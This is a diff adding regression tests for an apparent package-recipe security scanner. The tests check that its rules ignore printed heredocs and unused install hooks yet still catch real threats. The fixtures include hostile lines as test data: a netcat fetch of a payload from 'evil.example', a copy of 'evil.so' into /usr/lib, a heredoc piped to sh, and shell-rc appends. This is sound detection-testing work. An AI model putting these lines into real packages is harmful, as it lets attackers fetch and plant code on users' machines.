@@ -133,6 +133,52 @@ def test_c017_still_fires_on_an_actual_hook_write():
     assert "C017" in _ids(diff)
 
 
+# --- Printed heredocs: body text is output, not executed shell (openxlr) ----
+
+def _heredoc_install(line, extra="true\n"):
+    return ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,6 @@\n"
+            "+post_install() {\n"
+            "+  cat <<MSG\n"
+            f"+  {line}\n"
+            "+  MSG\n"
+            f"+  {extra}"
+            "+}\n")
+
+
+def test_r052_ignores_a_write_pattern_in_a_printed_heredoc():
+    diff = _heredoc_install('install -Dm644 x "$HOME/.x"')
+    assert "R052" not in _ids(diff)
+
+
+def test_r052_still_fires_on_an_executed_write():
+    diff = _heredoc_install("some advisory text", 'cp y /root/.y\n')
+    assert "R052" in _ids(diff)
+
+
+def test_c017_ignores_a_write_pattern_in_a_printed_heredoc():
+    diff = _heredoc_install('install -Dm644 x "$HOME/.x"')
+    assert "C017" not in _ids(diff)
+
+
+def test_c017_still_fires_on_an_executed_write():
+    diff = _heredoc_install("some advisory text",
+                            'install -Dm644 x "$HOME/.x"\n')
+    assert "C017" in _ids(diff)
+
+
+def test_c017_still_scans_a_heredoc_piped_to_a_shell():
+    # The opener pipes the body into an executor, so the body may be a
+    # script a later line runs: the printed-heredoc carve-out must not
+    # suppress it.
+    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,5 @@\n"
+            "+post_install() {\n"
+            "+  cat <<SCRIPT | sh\n"
+            "+  install -Dm644 x \"$HOME/.x\"\n"
+            "+  SCRIPT\n"
+            "+}\n")
+    assert "C017" in _ids(diff)
+
+
 # --- X002: a non-ASCII message is not a non-literal executable name ---------
 
 def test_x002_ignores_a_non_ascii_hook_message():
@@ -219,3 +265,302 @@ def test_a_refusal_only_package_is_below_the_alert_bar():
     ids = {e.rule_id for e in fact.score_breakdown}
     if "X027" in ids:
         assert fact.final_score <= _OVER_BENIGN_P95
+
+
+# --- C004: a one-for-one checksum refresh on a kernel bump ------------------
+
+def _kernel_bump_diff():
+    """A kernel-bump shape: 10 sources, multiline md5sums + sha256sums, a
+    local ``config`` slot whose hash changes, and one ``${pkgver}``-bearing
+    URL whose line is a context line (the literal variable is unchanged)."""
+    def arr(items):
+        return "(\n" + "".join(f"  '{i}'\n" for i in items) + " )"
+
+    def recipe(pkgver, config_md5, config_sha, url_md5, url_sha, extra):
+        sources = ["config", "https://cdn.example/linux-${pkgver}.tar.xz"]
+        sources += [f"https://cdn.example/patch-{n}.diff" for n in range(8)]
+        md5 = [config_md5, url_md5] + [f"0d5{n}" for n in range(8)]
+        sha = [config_sha, url_sha] + [f"1a2b{n}" for n in range(8)]
+        if extra:
+            sources.append("https://cdn.example/extra.diff")
+            md5.append("0d5x")
+            sha.append("1a2bx")
+        return (
+            f"pkgname=lts510\npkgver={pkgver}\n"
+            f"source={arr(sources)}\n"
+            f"md5sums={arr(md5)}\n"
+            f"sha256sums={arr(sha)}\n"
+        )
+
+    import difflib
+
+    old = recipe("5.10.0", "c0", "s0", "m0", "h0", extra=False)
+    new = recipe("5.10.1", "c1", "s1", "m1", "h1", extra=False)
+    return "\n".join(difflib.unified_diff(
+        old.splitlines(), new.splitlines(),
+        "a/PKGBUILD", "b/PKGBUILD", lineterm=""))
+
+
+def test_c004_does_not_fire_on_a_one_for_one_checksum_refresh():
+    """The versioned URL is a context line, so the added/removed URL sets
+    are empty; a misclassified ``checksum_entry_removed`` there used to
+    become C004.  A one-for-one replacement never shrinks the checksum
+    set, so the gate stands down."""
+    from trustsight.differ import extract_urls_from_diff
+
+    diff = _kernel_bump_diff()
+    assert extract_urls_from_diff(diff).checksum_behavior == \
+        "checksum_added_or_changed"
+    assert "C004" not in _ids(diff)
+
+
+def test_c004_still_fires_when_a_checksum_array_is_genuinely_lost():
+    """The true-positive twin: a checksum array deleted while the source
+    URLs stay unchanged is weakened verification and must still fire."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
+            " pkgname=demo\n pkgver=1.0\n"
+            " source=('https://x.example/a.tar.gz')\n"
+            "-sha256sums=('aaa')\n")
+    assert "C004" in _ids(diff)
+
+
+# --- Multi-line echo block: continuation lines are printed text --------------
+# 2026-10-16 watcher review (audirvana-studio/audirvana-origin, score 100):
+# the install hook opens `echo "` and prints several lines of guidance,
+# including mkdir/redirect text. None of it executes.
+
+_AUDIRVANA_HOOK = (
+    "+post_install() {\n"
+    '+echo "\n'
+    "+If the configuration directory is missing:\n"
+    "+mkdir -p ~/.config/audirvana\n"
+    "+echo 'EulaAccepted = 1' > ~/.config/audirvana/audirvana-studio.ini\n"
+    "+\n"
+    "+avahi should be enabled first with: sudo systemctl enable --now avahi-daemon\n"
+    '+To enable it at boot: systemctl --user enable audirvanaStudio"\n'
+    "+}\n"
+)
+
+
+def test_a_multiline_echo_block_is_not_a_write():
+    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,9 @@\n"
+            + _AUDIRVANA_HOOK)
+    ids = _ids(diff)
+    assert "C017" not in ids
+    assert "H032" not in ids
+    assert "H017" not in ids
+    assert "H004" not in ids
+
+
+def test_a_multiline_echo_block_does_not_hide_a_real_write():
+    # The same hook shape plus one line that really writes: the write must
+    # still be claimed.
+    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,6 @@\n"
+            "+post_install() {\n"
+            '+echo "guidance\n'
+            "+mkdir -p ~/.config/audirvana\n"
+            '+guidance"\n'
+            "+  mkdir -p /root/.config/tool\n"
+            "+}\n")
+    ids = _ids(diff)
+    assert "C017" in ids
+    # H032 defers to X005 for the same write (one write, one finding).
+    assert "H032" in ids or "X005" in ids
+
+
+# --- H016: a package name must not be read as a fetch client ---------------
+# 2026-10-16 watcher review (wipsync-bin): the client alternation had no
+# left word boundary, so `wi-psync-` matched the `nc` client and the
+# `.service` operand next to it read as a hidden download address.
+
+def test_h016_ignores_a_client_name_inside_the_package_name():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n"
+            " pkgname=wipsync-bin\n"
+            " pkgver=1\n"
+            "+package() {\n"
+            '+  install -Dm644 wipsync.service "$pkgdir/usr/lib/systemd/user/wipsync.service"\n'
+            "+}\n")
+    assert "H016" not in _ids(diff)
+
+
+def test_h016_still_fires_on_a_real_hidden_fetch():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n"
+            " pkgname=p\n"
+            " pkgver=1\n"
+            "+package() {\n"
+            "+  nc evil.example 9999 > payload.sh\n"
+            "+}\n")
+    assert "H016" in _ids(diff)
+
+
+# --- Dead hooks: behavior rules stand down when install= never names the file --
+# 2026-10-16 watcher review: notebook's X015 and mercure's H017 fired on
+# scriptlets in shipped .install files the recipe does not wire up.  C024
+# names that nit once; a hook pacman never runs schedules nothing.
+
+_DEAD_HOOK_DIFF = (
+    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
+    " pkgname=notebook\n"
+    " pkgver=2\n"
+    "--- a/notebook.install\n+++ b/notebook.install\n@@ -0,0 +1,3 @@\n"
+    "+post_install() {\n"
+    "+  systemctl --user enable --now notebook.service\n"
+    "+}\n"
+)
+
+
+def test_x015_stands_down_in_a_hook_install_never_names():
+    ids = _ids(_DEAD_HOOK_DIFF,
+               current_text="pkgname=notebook\npkgver=2\n")
+    assert "C024" in ids  # the undeclared hook itself is still named
+    assert "X015" not in ids
+
+
+def test_x015_still_fires_in_the_declared_hook():
+    ids = _ids(_DEAD_HOOK_DIFF,
+               current_text="pkgname=notebook\npkgver=2\n"
+               "install=notebook.install\n")
+    assert "X015" in ids
+
+
+def test_h017_stands_down_in_a_hook_install_never_names():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
+            " pkgname=mercure\n"
+            " pkgver=2\n"
+            "--- a/mercure.install\n+++ b/mercure.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n"
+            "+    useradd -c Mercure -g mercure mercure\n"
+            "+}\n")
+    ids = _ids(diff, current_text="pkgname=mercure\npkgver=2\n")
+    assert "C024" in ids
+    assert "H017" not in ids
+
+
+def test_h017_still_fires_in_the_declared_hook():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
+            " pkgname=mercure\n"
+            " pkgver=2\n"
+            "--- a/mercure.install\n+++ b/mercure.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n"
+            "+    useradd -c Mercure -g mercure mercure\n"
+            "+}\n")
+    ids = _ids(diff,
+               current_text="pkgname=mercure\npkgver=2\ninstall=mercure.install\n")
+    assert "H017" in ids
+
+
+# --- septabee: setcap on the package's own binaries in a hook --------------
+# 2026-10-16 watcher review: `sudo setcap cap_sys_nice=ep` on files under
+# /opt/septabee is the standard realtime-audio grant, and the hook exclusion
+# already keeps R059 off hook scriptlets.  H004 still claims the sudo
+# itself: a privilege tool inside a root scriptlet is anomalous by
+# construction and that behaviour is pinned by the keymux-era twins in
+# tests/regressions/test_alert_false_positives.py - the maintainer fix is
+# to drop the redundant sudo, not to suppress the rule.
+
+def test_r059_stands_down_for_setcap_inside_a_hook():
+    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n"
+            "+\tsudo setcap cap_sys_nice=ep '/opt/septabee/septabee'\n"
+            "+}\n")
+    ids = _ids(diff)
+    assert "R059" not in ids
+    assert "H004" in ids
+
+
+
+
+# --- R058: script text inside a file-writing heredoc is not a build write ---
+# 2026-10-16 watcher review (bluebubbles-desktop-app): the launcher wrapper
+# is authored with `cat <<EOF > "${pkgdir}/usr/bin/..."`; the body's runtime
+# `cp` to XDG_RUNTIME_DIR fired R058 as if the build wrote it.
+
+def test_r058_ignores_a_write_inside_a_file_writing_heredoc():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n"
+            " pkgname=p\n"
+            "+package() {\n"
+            '+    cat <<EOF > "${pkgdir}/usr/bin/launcher"\n'
+            "+#!/usr/bin/env bash\n"
+            '+_RT="${XDG_RUNTIME_DIR:-/tmp}/p-${UID}"\n'
+            '+cp -f "/usr/lib/p/p" "${_RT}/p.new" && mv -f "${_RT}/p.new" "${_RT}/p"\n'
+            "+exec \"${_RT}/p\"\n"
+            "+EOF\n"
+            "+    chmod 755 \"${pkgdir}/usr/bin/launcher\"\n"
+            "+}\n")
+    assert "R058" not in _ids(diff)
+
+
+def test_r058_still_fires_on_a_real_build_time_write():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
+            " pkgname=p\n"
+            "+package() {\n"
+            "+  cp evil.so /usr/lib/evil.so\n"
+            "+}\n")
+    assert "R058" in _ids(diff)
+
+
+def test_r058_still_fires_inside_a_heredoc_piped_to_a_shell():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n"
+            " pkgname=p\n"
+            "+package() {\n"
+            "+bash <<'SCRIPT'\n"
+            "+cp x /usr/bin/x\n"
+            "+SCRIPT\n"
+            "+}\n")
+    assert "R058" in _ids(diff)
+
+
+# --- C016/C017 stand down in dead hooks, as H017 and X015 already do --------
+# 2026-10-16 watcher review (patent-bin): a root-rc write inside
+# patent-bin.install fired C017, but install= names patent.install - the
+# hook never runs (C024 names that).  The live sibling (patent) keeps its
+# C017.
+
+def test_c017_stands_down_in_a_hook_install_never_names():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
+            " pkgname=patent-bin\n"
+            " install=patent.install\n"
+            "--- a/patent-bin.install\n+++ b/patent-bin.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n"
+            '+    echo "x" >> ~/.$(basename "$SHELL")rc\n'
+            "+}\n")
+    ids = _ids(diff, current_text="pkgname=patent-bin\ninstall=patent.install\n")
+    assert "C024" in ids
+    assert "C017" not in ids
+
+
+def test_c017_still_fires_in_the_declared_hook():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
+            " pkgname=patent\n"
+            " install=patent.install\n"
+            "--- a/patent.install\n+++ b/patent.install\n@@ -0,0 +1,3 @@\n"
+            "+post_install() {\n"
+            '+    echo "x" >> ~/.$(basename "$SHELL")rc\n'
+            "+}\n")
+    ids = _ids(diff, current_text="pkgname=patent\ninstall=patent.install\n")
+    assert "C017" in ids
+
+
+# --- Hardening: the dead-hook gate reads only the PKGBUILD's declaration ----
+# An `install=`-shaped line inside a hook body or patch is not the recipe's
+# declaration; misreading it would stand behavior rules down on a live hook.
+
+def test_the_dead_hook_gate_ignores_install_shaped_text_in_a_hook():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
+            " pkgname=p\n"
+            "--- a/p.install\n+++ b/p.install\n@@ -0,0 +1,4 @@\n"
+            "+post_install() {\n"
+            "+  install=other.install\n"
+            "+  mkdir -p /root/.x\n"
+            "+}\n")
+    # No declaration is visible at all, so nothing is provably dead and
+    # the behavior rule keeps firing.
+    ids = _ids(diff)
+    assert "C017" in ids
+
+
+def test_r007_fires_on_a_spaced_install_declaration():
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+            " pkgname=p\n"
+            "+install = p.install\n")
+    assert "R007" in _ids(diff)
